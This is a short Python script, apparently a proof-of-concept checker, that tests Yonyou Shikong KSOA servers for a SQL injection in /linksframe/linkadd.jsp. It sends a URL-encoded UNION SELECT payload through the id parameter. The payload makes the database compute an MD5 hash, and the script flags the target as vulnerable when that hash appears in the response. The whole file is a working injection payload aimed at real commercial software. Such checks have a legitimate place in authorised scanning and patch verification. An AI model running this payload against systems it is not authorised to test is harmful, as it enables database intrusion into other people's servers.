import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友时空KSOA-linkadd.jsp存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept': '*/*',
        'Connection': 'Keep-Alive'
    }
    vurl = urllib.parse.urljoin(url, "/linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%27123456%27%29%29%2Cnull%2Cnull%2C%27")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and 'e10adc3949ba59abbe56e057f20f883e' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult